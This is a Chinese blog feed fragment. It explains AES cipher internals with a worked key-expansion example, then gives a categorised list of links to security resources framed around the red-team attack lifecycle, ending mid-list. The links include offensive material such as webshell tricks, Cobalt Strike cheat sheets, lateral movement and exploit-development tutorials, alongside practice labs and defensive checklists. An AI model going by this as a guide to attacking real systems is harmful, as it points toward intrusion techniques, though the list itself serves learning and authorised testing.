title="字节逆代换操作"></a>字节逆代换操作</h3><p>逆S盒：</p><table><thead><tr><th>行/列</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th></tr></thead><tbody><tr><td>0</td><td>0x52</td><td>0x09</td><td>0x6a</td><td>0xd5</td><td>0x30</td><td>0x36</td><td>0xa5</td><td>0x38</td><td>0xbf</td><td>0x40</td><td>0xa3</td><td>0x9e</td><td>0x81</td><td>0xf3</td><td>0xd7</td><td>0xfb</td></tr><tr><td>1</td><td>0x7c</td><td>0xe3</td><td>0x39</td><td>0x82</td><td>0x9b</td><td>0x2f</td><td>0xff</td><td>0x87</td><td>0x34</td><td>0x8e</td><td>0x43</td><td>0x44</td><td>0xc4</td><td>0xde</td><td>0xe9</td><td>0xcb</td></tr><tr><td>2</td><td>0x54</td><td>0x7b</td><td>0x94</td><td>0x32</td><td>0xa6</td><td>0xc2</td><td>0x23</td><td>0x3d</td><td>0xee</td><td>0x4c</td><td>0x95</td><td>0x0b</td><td>0x42</td><td>0xfa</td><td>0xc3</td><td>0x4e</td></tr><tr><td>3</td><td>0x08</td><td>0x2e</td><td>0xa1</td><td>0x66</td><td>0x28</td><td>0xd9</td><td>0x24</td><td>0xb2</td><td>0x76</td><td>0x5b</td><td>0xa2</td><td>0x49</td><td>0x6d</td><td>0x8b</td><td>0xd1</td><td>0x25</td></tr><tr><td>4</td><td>0x72</td><td>0xf8</td><td>0xf6</td><td>0x64</td><td>0x86</td><td>0x68</td><td>0x98</td><td>0x16</td><td>0xd4</td><td>0xa4</td><td>0x5c</td><td>0xcc</td><td>0x5d</td><td>0x65</td><td>0xb6</td><td>0x92</td></tr><tr><td>5</td><td>0x6c</td><td>0x70</td><td>0x48</td><td>0x50</td><td>0xfd</td><td>0xed</td><td>0xb9</td><td>0xda</td><td>0x5e</td><td>0x15</td><td>0x46</td><td>0x57</td><td>0xa7</td><td>0x8d</td><td>0x9d</td><td>0x84</td></tr><tr><td>6</td><td>0x90</td><td>0xd8</td><td>0xab</td><td>0x00</td><td>0x8c</td><td>0xbc</td><td>0xd3</td><td>0x0a</td><td>0xf7</td><td>0xe4</td><td>0x58</td><td>0x05</td><td>0xb8</td><td>0xb3</td><td>0x45</td><td>0x06</td></tr><tr><td>7</td><td>0xd0</td><td>0x2c</td><td>0x1e</td><td>0x8f</td><td>0xca</td><td>0x3f</td><td>0x0f</td><td>0x02</td><td>0xc1</td><td>0xaf</td><td>0xbd</td><td>0x03</td><td>0x01</td><td>0x13</td><td>0x8a</td><td>0x6b</td></tr><tr><td>8</td><td>0x3a</td><td>0x91</td><td>0x11</td><td>0x41</td><td>0x4f</td><td>0x67</td><td>0xdc</td><td>0xea</td><td>0x97</td><td>0xf2</td><td>0xcf</td><td>0xce</td><td>0xf0</td><td>0xb4</td><td>0xe6</td><td>0x73</td></tr><tr><td>9</td><td>0x96</td><td>0xac</td><td>0x74</td><td>0x22</td><td>0xe7</td><td>0xad</td><td>0x35</td><td>0x85</td><td>0xe2</td><td>0xf9</td><td>0x37</td><td>0xe8</td><td>0x1c</td><td>0x75</td><td>0xdf</td><td>0x6e</td></tr><tr><td>A</td><td>0x47</td><td>0xf1</td><td>0x1a</td><td>0x71</td><td>0x1d</td><td>0x29</td><td>0xc5</td><td>0x89</td><td>0x6f</td><td>0xb7</td><td>0x62</td><td>0x0e</td><td>0xaa</td><td>0x18</td><td>0xbe</td><td>0x1b</td></tr><tr><td>B</td><td>0xfc</td><td>0x56</td><td>0x3e</td><td>0x4b</td><td>0xc6</td><td>0xd2</td><td>0x79</td><td>0x20</td><td>0x9a</td><td>0xdb</td><td>0xc0</td><td>0xfe</td><td>0x78</td><td>0xcd</td><td>0x5a</td><td>0xf4</td></tr><tr><td>C</td><td>0x1f</td><td>0xdd</td><td>0xa8</td><td>0x33</td><td>0x88</td><td>0x07</td><td>0xc7</td><td>0x31</td><td>0xb1</td><td>0x12</td><td>0x10</td><td>0x59</td><td>0x27</td><td>0x80</td><td>0xec</td><td>0x5f</td></tr><tr><td>D</td><td>0x60</td><td>0x51</td><td>0x7f</td><td>0xa9</td><td>0x19</td><td>0xb5</td><td>0x4a</td><td>0x0d</td><td>0x2d</td><td>0xe5</td><td>0x7a</td><td>0x9f</td><td>0x93</td><td>0xc9</td><td>0x9c</td><td>0xef</td></tr><tr><td>E</td><td>0xa0</td><td>0xe0</td><td>0x3b</td><td>0x4d</td><td>0xae</td><td>0x2a</td><td>0xf5</td><td>0xb0</td><td>0xc8</td><td>0xeb</td><td>0xbb</td><td>0x3c</td><td>0x83</td><td>0x53</td><td>0x99</td><td>0x61</td></tr><tr><td>F</td><td>0x17</td><td>0x2b</td><td>0x04</td><td>0x7e</td><td>0xba</td><td>0x77</td><td>0xd6</td><td>0x26</td><td>0xe1</td><td>0x69</td><td>0x14</td><td>0x63</td><td>0x55</td><td>0x21</td><td>0x0c</td><td>0x7d</td></tr></tbody></table><h2 id="行移位"><a href="#行移位" class="headerlink" title="行移位"></a>行移位</h2><h3 id="行移位操作"><a href="#行移位操作" class="headerlink" title="行移位操作"></a>行移位操作</h3><p>行移位是一个简单的左循环移位操作。当密钥长度为128比特时，状态矩阵的第0行左移0字节，第1行左移1字节，第2行左移2字节，第3行左移3字节，如下图所示：</p><p><img src="https://i.loli.net/2021/03/16/ZFwtBYvK5UDqH8p.jpg" alt="shiftRows"></p><h3 id="行移位的逆变换"><a href="#行移位的逆变换" class="headerlink" title="行移位的逆变换"></a>行移位的逆变换</h3><p>行移位的逆变换是将状态矩阵中的每一行执行相反的移位操作，例如AES-128中，状态矩阵的第0行右移0字节，第1行右移1字节，第2行右移2字节，第3行右移3字节。</p><h2 id="列混合"><a href="#列混合" class="headerlink" title="列混合"></a>列混合</h2><h3 id="列混合操作"><a href="#列混合操作" class="headerlink" title="列混合操作"></a>列混合操作</h3><p>列混合变换是通过矩阵相乘来实现的，经行移位后的状态矩阵与固定的矩阵相乘，得到混淆后的状态矩阵，如下图的公式所示：<img src="https://i.loli.net/2021/03/16/CEM5wJhtB9T4G7H.png" alt="col"></p><p>状态矩阵中的第j列(0 ≤j≤3)的列混合可以表示为下图所示：</p><p><img src="https://i.loli.net/2021/03/16/SOBAQWxIjV8NsYe.png" alt="col2"></p><p>其中，矩阵元素的乘法和加法都是定义在基于GF(2^8)上的二元运算,并不是通常意义上的乘法和加法。这里涉及到一些信息安全上的数学知识，不过不懂这些知识也行。其实这种二元运算的加法等价于两个字节的异或，乘法则复杂一点。对于一个8位的二进制数来说，使用域上的乘法乘以(00000010)等价于左移1位(低位补0)后，再根据情况同(00011011)进行异或运算，设S1 = (a7 a6 a5 a4 a3 a2 a1 a0)，刚0x02 * S1如下图所示：</p><p><img src="https://i.loli.net/2021/03/16/XlzIHbsLn7FQ1Ac.png" alt="col3"></p><p>也就是说，如果a7为1，则进行异或运算，否则不进行。<br>类似地，乘以(00000100)可以拆分成两次乘以(00000010)的运算：</p><p><img src="https://i.loli.net/2021/03/16/8KFwQzSA26DcHsP.png" alt="col4"></p><p>乘以(0000 0011)可以拆分成先分别乘以(0000 0001)和(0000 0010)，再将两个乘积异或：</p><p><img src="https://i.loli.net/2021/03/16/vjO1Zn3u48LFWly.png" alt="在这里插入图片描述"></p><p>因此，我们只需要实现乘以2的函数，其他数值的乘法都可以通过组合来实现。<br>下面举个具体的例子,输入的状态矩阵如下：</p><table><thead><tr><th>C9</th><th>E5</th><th>FD</th><th>2B</th></tr></thead><tbody><tr><td>7A</td><td>F2</td><td>78</td><td>6E</td></tr><tr><td>63</td><td>9C</td><td>26</td><td>67</td></tr><tr><td>B0</td><td>A7</td><td>82</td><td>E5</td></tr></tbody></table><p>下面，进行列混合运算：<br>以第一列的运算为例：</p><p><img src="https://i.loli.net/2021/03/16/AhZwsVkdbJMjf3W.png" alt="col7"></p><p>其它列的计算就不列举了，列混合后生成的新状态矩阵如下：</p><table><thead><tr><th>D4</th><th>E7</th><th>CD</th><th>66</th></tr></thead><tbody><tr><td>28</td><td>02</td><td>E5</td><td>BB</td></tr><tr><td>BE</td><td>C6</td><td>D6</td><td>BF</td></tr><tr><td>22</td><td>0F</td><td>DF</td><td>A5</td></tr></tbody></table><h3 id="列混合逆运算"><a href="#列混合逆运算" class="headerlink" title="列混合逆运算"></a>列混合逆运算</h3><p>逆向列混合变换可由下图的矩阵乘法定义：</p><p><img src="https://i.loli.net/2021/03/16/oJbPNnvGU13Kie7.png" alt="col6"></p><p>可以验证，逆变换矩阵同正变换矩阵的乘积恰好为单位矩阵。</p><h2 id="轮密钥加"><a href="#轮密钥加" class="headerlink" title="轮密钥加"></a>轮密钥加</h2><p>轮密钥加是将128位轮密钥Ki同状态矩阵中的数据进行逐位异或操作，如下图所示。其中，密钥Ki中每个字W[4i],W[4i+1],W[4i+2],W[4i+3]为32位比特字，包含4个字节，他们的生成算法下面在下面介绍。轮密钥加过程可以看成是字逐位异或的结果，也可以看成字节级别或者位级别的操作。也就是说，可以看成S0 S1 S2 S3 组成的32位字与W[4i]的异或运算。</p><p><img src="https://i.loli.net/2021/03/16/m1bFspPf2oqSKvD.jpg" alt="roundadd"></p><p>轮密钥加的逆运算同正向的轮密钥加运算完全一致，这是因为异或的逆操作是其自身。轮密钥加非常简单，但却能够影响S数组中的每一位。</p><h2 id="密钥扩展"><a href="#密钥扩展" class="headerlink" title="密钥扩展"></a>密钥扩展</h2><p>AES首先将初始密钥输入到一个4*4的状态矩阵中，如下图所示。</p><p><img src="https://i.loli.net/2021/03/16/Qf6LJzjmxn4O7YN.jpg" alt="keyextends"></p><p>这个4*4矩阵的每一列的4个字节组成一个字，矩阵4列的4个字依次命名为W[0]、W[1]、W[2]和W[3]，它们构成一个以字为单位的数组W。例如，设密钥K为”abcdefghijklmnop”,则K0 = ‘a’,K1 = ‘b’, K2 = ‘c’,K3 = ‘d’,W[0] = “abcd”。<br>接着，对W数组扩充40个新列，构成总共44列的扩展密钥数组。新列以如下的递归方式产生：<br>1.如果i不是4的倍数，那么第i列由如下等式确定：<br>W[i]=W[i-4]⨁W[i-1]<br>2.如果i是4的倍数，那么第i列由如下等式确定：<br>W[i]=W[i-4]⨁T(W[i-1])<br>其中，T是一个有点复杂的函数。<br>函数T由3部分组成：字循环、字节代换和轮常量异或，这3部分的作用分别如下。<br>a.字循环：将1个字中的4个字节循环左移1个字节。即将输入字[b0, b1, b2, b3]变换成[b1,b2,b3,b0]。<br>b.字节代换：对字循环的结果使用S盒进行字节代换。<br>c.轮常量异或：将前两步的结果同轮常量Rcon[j]进行异或，其中j表示轮数。<br>轮常量Rcon[j]是一个字，其值见下表。</p><table><thead><tr><th>j</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th></tr></thead><tbody><tr><td>Rcon[j]</td><td>01 00 00 00</td><td>02 00 00 00</td><td>04 00 00 00</td><td>08 00 00 00</td><td>10 00 00 00</td></tr><tr><td>j</td><td>6</td><td>7</td><td>8</td><td>9</td><td>10</td></tr><tr><td>Rcon[j]</td><td>20 00 00 00</td><td>40 00 00 00</td><td>80 00 00 00</td><td>1B 00 00 00</td><td>36 00 00 00</td></tr></tbody></table><p>下面举个例子：<br>设初始的128位密钥为：<br>3C A1 0B 21 57 F0 19 16 90 2E 13 80 AC C1 07 BD<br>那么4个初始值为：<br>W[0] = 3C A1 0B 21<br>W[1] = 57 F0 19 16<br>W[2] = 90 2E 13 80<br>W[3] = AC C1 07 BD<br>下面求扩展的第1轮的子密钥(W[4],W[5],W[6],W[7])。<br>由于4是4的倍数，所以：<br>W[4] = W[0] ⨁ T(W[3])<br>T(W[3])的计算步骤如下：</p><ol><li><p>循环地将W[3]的元素移位：AC C1 07 BD变成C1 07 BD AC; </p></li><li><p>将 C1 07 BD AC 作为S盒的输入，输出为78 C5 7A 91;</p></li><li><p>将78 C5 7A 91与第一轮轮常量Rcon[1]进行异或运算，将得到79 C5 7A 91，因此，T(W[3])=79 C5 7A 91，故<br>W[4] = 3C A1 0B 21 ⨁ 79 C5 7A 91 = 45 64 71 B0<br>其余的3个子密钥段的计算如下：<br>W[5] = W[1] ⨁ W[4] = 57 F0 19 16 ⨁ 45 64 71 B0 = 12 94 68 A6<br>W[6] = W[2] ⨁ W[5] =90 2E 13 80 ⨁ 12 94 68 A6 = 82 BA 7B 26<br>W[7] = W[3] ⨁ W[6] = AC C1 07 BD ⨁ 82 BA 7B 26 = 2E 7B 7C 9B<br>所以，第一轮的密钥为 45 64 71 B0 12 94 68 A6 82 BA 7B 26 2E 7B 7C 9B。</p></li></ol><h1 id="AES解密"><a href="#AES解密" class="headerlink" title="AES解密"></a>AES解密</h1><p>在文章开始的图中，有AES解密的流程图，可以对应那个流程图来进行解密。下面介绍的是另一种等价的解密模式，流程图如下图所示。这种等价的解密模式使得解密过程各个变换的使用顺序同加密过程的顺序一致，只是用逆变换取代原来的变换。</p><p><img src="https://i.loli.net/2021/03/16/fy5a3BucD4Y8e2S.jpg" alt="deaes"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;AES加密简介&quot;&gt;&lt;a href=&quot;#AES加密简介&quot; class=&quot;headerlink&quot; title=&quot;AES加密简介&quot;&gt;&lt;/a&gt;AES加密简介&lt;/h1&gt;&lt;p&gt;高级加密标准(AES,Advanced Encryption Standard)为最常见的&lt;strong&gt;对称加密算法&lt;/strong&gt;(微信小程序加密传输就是用这个加密算法的)。&lt;/p&gt;
    
    </summary>
    
    
      <category term="密码学" scheme="http://goudanjun.vip/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
      <category term="AES" scheme="http://goudanjun.vip/tags/AES/"/>
    
  </entry>
  
  <entry>
    <title>资料汇总</title>
    <link href="http://goudanjun.vip/2021/03/13/%E8%B5%84%E6%96%99%E6%B1%87%E6%80%BB.html/"/>
    <id>http://goudanjun.vip/2021/03/13/资料汇总.html/</id>
    <published>2021-03-13T07:49:14.000Z</published>
    <updated>2021-03-13T08:06:35.594Z</updated>
    
    <content type="html"><![CDATA[<h2 id="项目简介"><a href="#项目简介" class="headerlink" title="项目简介"></a><strong>项目简介</strong></h2><p><strong><em>\</em>一个 Red Team 攻击的生命周期，整个生命周期包括：信息收集、攻击尝试获得权限、持久性控制、权限提升、网络信息收集、横向移动、数据分析（在这个基础上再做持久化控制）、在所有攻击结束之后清理并退出战场。**</strong></p><a id="more"></a><h2 id="相关资源列表"><a href="#相关资源列表" class="headerlink" title="相关资源列表"></a><strong>相关资源列表</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">https://mitre-attack.github.io/ mitre科技机构对攻击技术的总结wiki</span><br><span class="line">https://huntingday.github.io MITRE | ATT&amp;CK 中文站</span><br><span class="line">https://arxiv.org 康奈尔大学（Cornell University）开放文档</span><br><span class="line">http://www.owasp.org.cn/owasp-project/owasp-things OWASP项目</span><br><span class="line">http://www.irongeek.com/i.php?page=security/hackingillustrated国内外安全大会相关视频与文档</span><br><span class="line">https://github.com/knownsec/KCon KCon大会文章PPT</span><br><span class="line">https://github.com/SecWiki/sec-chart 各种相关安全思维导图集合</span><br><span class="line">https://github.com/knownsec/RD_Checklist 知道创宇技能列表</span><br><span class="line">https://github.com/ChrisLinn/greyhame-2017 灰袍技能书2017版本</span><br><span class="line">https://github.com/Hack-with-Github/Awesome-Hacking GitHub万星推荐：黑客成长技术清单</span><br><span class="line">https://github.com/k4m4/movies-for-hackers 安全相关电影</span><br><span class="line">https://github.com/jaredthecoder/awesome-vehicle-security 一个用于了解车辆安全和汽车黑客的资源清单</span><br><span class="line">https://www.jianshu.com/p/852e0fbe2f4c 安全产品厂商分类</span><br><span class="line">https://www.reddit.com/r/Python/comments/a81mg3/the_entire_mit_intro_computer_science_class_using/ 麻省理工机器学习视频</span><br><span class="line">https://github.com/fxsjy/jieba py，结巴中文分词</span><br><span class="line">https://github.com/thunlp/THULAC-Python py，清华中文分词</span><br><span class="line">https://github.com/lancopku/PKUSeg-python py3，北大中文分词</span><br><span class="line">https://github.com/fengdu78/Coursera-ML-AndrewNg-Notes 吴恩达机器学习python笔记</span><br><span class="line">https://paperswithcode.com/sota 机器学习具体项目、演示、代码</span><br><span class="line">https://github.com/duoergun0729/nlp 一本开源的NLP（神经语言程序学）入门书籍</span><br><span class="line">https://www.freebuf.com/articles/web/195304.html 一句话木马的套路</span><br></pre></td></tr></table></figure><h2 id="攻防测试手册"><a href="#攻防测试手册" class="headerlink" title="攻防测试手册"></a><strong>攻防测试手册</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">https://micropoor.blogspot.com/2019/01/php8.html PHP安全新闻早8点课程系列高持续渗透--Microporor</span><br><span class="line">https://github.com/Micropoor/Micro8 Microporor高级攻防100课</span><br><span class="line">https://github.com/maskhed/Papers 包含100课等经典攻防教材、安全知识</span><br><span class="line">https://github.com/infosecn1nja/AD-Attack-Defense 红蓝方攻防手册</span><br><span class="line">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming 优秀红队资源列表</span><br><span class="line">https://github.com/foobarto/redteam-notebook 红队标准渗透测试流程+常用命令</span><br><span class="line">https://github.com/tom0li/collection-document 文章收集：安全部、SDL、src、渗透测试、漏洞利用</span><br><span class="line">https://github.com/kbandla/APTnotes 各种公开的文件和相关的APT笔记，还有软件样本</span><br><span class="line">https://wizardforcel.gitbooks.io/web-hacking-101/content Web Hacking 101 中文版</span><br><span class="line">https://techvomit.net/web-application-penetration-testing-notes/ web渗透测试笔记</span><br><span class="line">https://github.com/qazbnm456/awesome-web-security Web安全资料和资源列表</span><br><span class="line">http://pentestmonkey.net/category/cheat-sheet 渗透测试常见条目</span><br><span class="line">https://github.com/demonsec666/Security-Toolkit 渗透攻击链中常用工具及使用场景</span><br><span class="line">https://github.com/Kinimiwar/Penetration-Testing 渗透测试方向优秀资源收集</span><br><span class="line">https://github.com/jshaw87/Cheatsheets 渗透测试/安全秘籍/笔记</span><br></pre></td></tr></table></figure><h2 id="内网安全文档"><a href="#内网安全文档" class="headerlink" title="内网安全文档"></a><strong>内网安全文档</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://attack.mitre.org/wiki/Lateral_Movement mitre机构对横向移动的总结</span><br><span class="line">https://payloads.online/archivers/2018-11-30/1 彻底理解Windows认证 - 议题解读</span><br><span class="line">https://github.com/klionsec/klionsec.github.io 内网大牛的学习历程</span><br><span class="line">https://github.com/l3m0n/pentest_study 从零开始内网渗透学习</span><br><span class="line">https://github.com/Ridter/Intranet_Penetration_Tips 内网渗透TIPS</span><br></pre></td></tr></table></figure><h2 id="学习手册相关资源"><a href="#学习手册相关资源" class="headerlink" title="学习手册相关资源"></a><strong>学习手册相关资源</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/HarmJ0y/CheatSheets 多个项目的速查手册（Beacon / Cobalt Strike，PowerView，PowerUp，Empire和PowerSploit）</span><br><span class="line">https://wizardforcel.gitbooks.io/kali-linux-web-pentest-cookbook/content/ Kali Linux Web渗透测试秘籍 中文版</span><br><span class="line">https://github.com/louchaooo/kali-tools-zh kali下工具使用介绍手册</span><br><span class="line">https://www.offensive-security.com/metasploit-unleashed/ kali出的metasploit指导笔记</span><br><span class="line">http://www.hackingarticles.in/comprehensive-guide-on-hydra-a-brute-forcing-tool/ hydra使用手册</span><br><span class="line">https://www.gitbook.com/book/t0data/burpsuite/details burpsuite实战指南</span><br><span class="line">https://zhuanlan.zhihu.com/p/26618074 Nmap扩展脚本使用方法</span><br><span class="line">https://somdev.me/21-things-xss/ XSS的21个扩展用途</span><br><span class="line">https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/ sql注入sheet表</span><br><span class="line">https://sqlwiki.netspi.com/ 你要的sql注入知识点都能找到</span><br><span class="line">https://github.com/kevins1022/SQLInjectionWiki 一个专注于聚合和记录各种SQL注入方法的wiki</span><br><span class="line">https://github.com/hardenedlinux/linux-exploit-development-tutorial Linux exploit 开发入门</span><br><span class="line">https://wizardforcel.gitbooks.io/asani/content 浅入浅出Android安全 中文版</span><br><span class="line">https://wizardforcel.gitbooks.io/lpad/content Android 渗透测试学习手册 中文版</span><br><span class="line">https://github.com/writeups/ios ios漏洞writeup笔记</span><br><span class="line">http://blog.safebuff.com/2016/07/03/SSRF-Tips/ ssrf漏洞利用手册</span><br></pre></td></tr></table></figure><h2 id="Checklist和基础安全知识"><a href="#Checklist和基础安全知识" class="headerlink" title="Checklist和基础安全知识"></a><strong>Checklist和基础安全知识</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">https://book.yunzhan365.com/umta/rtnp/mobile/index.html 网络安全科普小册子</span><br><span class="line">http://sec.cuc.edu.cn/huangwei/textbook/ns/ 网络安全电子版教材。中传信安课程网站</span><br><span class="line">https://mitre.github.io/attack-navigator/enterprise/ mitre机构att&amp;ck入侵检测条目</span><br><span class="line">https://github.com/danielmiessler/SecLists 表类型包括用户名，密码，URL，敏感数据模式，模糊测试负载，Web shell等</span><br><span class="line">https://github.com/GitGuardian/APISecurityBestPractices api接口测试checklist</span><br><span class="line">https://github.com/ym2011/SecurityManagement 分享在建设安全管理体系、ISO27001、等级保护、安全评审过程中的点点滴滴</span><br><span class="line">https://mp.weixin.qq.com/s/O36e0gl4cs0ErQPsb5L68Q 区块链，以太坊智能合约审计 CheckList</span><br><span class="line">https://github.com/slowmist/eos-bp-nodes-security-checklist 区块链，EOS bp nodes security checklist（EOS超级节点安全执行指南）</span><br><span class="line">https://xz.aliyun.com/t/2089 金融科技SDL安全设计checklist</span><br><span class="line">https://github.com/juliocesarfort/public-pentesting-reports 由几家咨询公司和学术安全组织发布的公共渗透测试报告的列表。</span><br><span class="line">http://www.freebuf.com/articles/network/169632.html 开源软件创建SOC的一份清单</span><br><span class="line">https://github.com/0xRadi/OWASP-Web-Checklist owasp网站检查条目</span><br><span class="line">https://www.securitypaper.org/ SDL开发安全生命周期管理</span><br><span class="line">https://github.com/Jsitech/JShielder linux下服务器一键加固脚本</span><br><span class="line">https://github.com/wstart/DB_BaseLine 数据库基线检查工具</span><br></pre></td></tr></table></figure><h2 id="产品设计文档"><a href="#产品设计文档" class="headerlink" title="产品设计文档"></a><strong>产品设计文档</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/sectool/135032.html 构建一个高交互型的难以发现的蜜罐</span><br><span class="line">https://bloodzer0.github.io/ossa/ 利用开源文件进行开源安全架构.主机、扫描器、端口、日志、防护设备等</span><br><span class="line">https://github.com/dvf/blockchain 用Python从零开始创建区块链</span><br><span class="line">https://github.com/crazywa1ker/DarthSidious-Chinese 从0开始你的域渗透之旅，DarthSidious 中文版</span><br><span class="line">https://paper.seebug.org/772/ 如何使用 KittyFuzzer 结合 ISF 中的工控协议组件对工控协议进行 Fuzz</span><br></pre></td></tr></table></figure><h2 id="学习靶场"><a href="#学习靶场" class="headerlink" title="学习靶场"></a><strong>学习靶场</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">https://www.blackmoreops.com/2018/11/06/124-legal-hacking-websites-to-practice-and-learn/ 124个合法的可以练习Hacking技术的网站</span><br><span class="line">https://www.zhihu.com/question/267204109 学web安全去哪里找各种各样的靶场？</span><br><span class="line">https://www.vulnhub.com 许多ctf靶机汇总</span><br><span class="line">https://www.wechall.net 世界知名ctf汇总交流网站</span><br><span class="line">https://www.xssgame.com 谷歌XSS挑战</span><br><span class="line">http://xss.tv 在线靶场挑战</span><br><span class="line">https://www.hackthebox.eu 在线靶场挑战</span><br><span class="line">https://www.root-me.org 在线靶场挑战</span><br><span class="line">http://www.itsecgames.com bWAPP，包含 100多种漏洞环境</span><br><span class="line">https://github.com/c0ny1/vulstudy 多种漏洞复现系统的docker汇总</span><br><span class="line">https://github.com/bkimminich/juice-shop 常见web安全实验靶场市场</span><br><span class="line">https://github.com/ethicalhack3r/DVWA web安全实验靶场</span><br><span class="line">https://www.freebuf.com/articles/web/123779.html 新手指南：DVWA-1.9全级别教程</span><br><span class="line">https://github.com/78778443/permeate php，常见漏洞靶场</span><br><span class="line">https://github.com/gh0stkey/DoraBox php,常见漏洞靶场</span><br><span class="line">https://github.com/stamparm/DSVW py2,常见漏洞靶场</span><br><span class="line">https://github.com/amolnaik4/bodhi py,常见漏洞靶场</span><br><span class="line">https://github.com/Safflower/Solve-Me php，韩国一个偏代码审计的ctf靶场源码</span><br><span class="line">https://github.com/WebGoat/WebGoat 一键jar包，web安全实验靶场</span><br><span class="line">https://github.com/Audi-1/sqli-labs 基于SQLite的sql注入学习靶场</span><br><span class="line">https://github.com/lcamry/sqli-labs 通过sqli-labs演示mysql相关的注入手法</span><br><span class="line">https://github.com/c0ny1/upload-labs 一个帮你总结所有类型的上传漏洞的靶场</span><br><span class="line">https://github.com/LandGrey/upload-labs-writeup upload-labs指导手册</span><br><span class="line">https://github.com/Go0s/LFIboomCTF 本地文件包含漏洞&amp;&amp;PHP利用协议&amp;&amp;实践源码</span><br><span class="line">https://in.security/lin-security-practise-your-linux-privilege-escalation-foo/ 一个虚拟机文件用于linux提权练习</span><br><span class="line">https://github.com/OWASP/igoat 适用于ios应用程序测试和安全性的学习工具</span><br><span class="line">https://github.com/prateek147/DVIA-v2 适用于ios应用程序测试和安全性的学习工具</span><br><span class="line">https://github.com/rapid7/metasploitable3 metasploit练习系统</span><br><span class="line">https://github.com/rapid7/metasploit-vulnerability-emulator 基于perl的metasploit模拟环境，练习操作</span><br><span class="line">https://github.com/chryzsh/DarthSidious AD域环境的搭建、渗透、防护</span><br><span class="line">https://github.com/c0ny1/xxe-lab 一个包含php,java,python,C#等各种语言版本的XXE漏洞Demo</span><br></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/vulhub/vulhub Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，执行两条命令即可编译、运行一个完整的漏洞靶场镜像</span><br><span class="line">https://github.com/Medicean/VulApps 收集各种漏洞环境，为方便使用，统一采用 Dockerfile 形式。同时也收集了安全工具环境。</span><br><span class="line">https://github.com/bingohuang/docker-labs 制作在线docker平台</span><br></pre></td></tr></table></figure><h2 id="开源漏洞库"><a href="#开源漏洞库" class="headerlink" title="开源漏洞库"></a><strong>开源漏洞库</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">https://wooyun.kieran.top/#!/ 2016年之前，乌云Drops文章，公开漏洞详情文章</span><br><span class="line">https://wooyun.js.org/ 2016年之前，乌云Drops文章，公开漏洞详情文章</span><br><span class="line">https://dvpnet.io/list/index/state/3 